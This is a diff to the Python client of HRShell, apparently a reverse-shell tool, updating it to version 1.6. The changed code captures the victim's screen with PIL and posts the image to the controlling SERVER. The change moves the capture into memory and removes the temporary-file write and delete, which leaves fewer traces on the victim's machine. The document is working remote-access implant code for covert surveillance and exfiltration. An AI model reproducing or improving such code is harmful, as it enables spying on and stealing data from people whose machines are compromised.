@@ -4,10 +4,11 @@
 __Author__      = 'Christophoros Petrou (game0ver)'
 __Project_url__ = 'https://github.com/chrispetrou/HRShell'
 __License__     = 'GNU General Public License v3.0'
-__Version__     = '1.5'
+__Version__     = '1.6'
 
 import os
 import re
+import io
 import sys
 import mmap
 import time
@@ -302,20 +303,14 @@ try:
                         try:
                             from PIL import ImageGrab
                             screen_shot = ImageGrab.grab()
-                            screenshot_name = "screenshot_{}.png".format(randint(0, 1000))
-                            screen_shot.save(screenshot_name)
-                            with open(screenshot_name,'rb') as f:
-                                screenshot_data = f.read()
+                            image_data = io.BytesIO()
+                            screen_shot.save(image_data, format='PNG')
                             s.post(SERVER,
                                 headers={
-                                    "Filename" : screenshot_name,
-                                    "Action"   : 'download'
+                                    "Action"   : 'screenshot'
                                 },
-                                data=benc(screenshot_data))
-                            if os.name=='nt':
-                                exec_cmd('del {}'.format(screenshot_name))
-                            else:
-                                exec_cmd('rm {}'.format(screenshot_name))
+                                data=image_data.getvalue()
+                            )
                         except ImportError:
                             s.post(SERVER, data='ERROR: Pillow module is not installed.')
                         except Exception as screenshot_error:
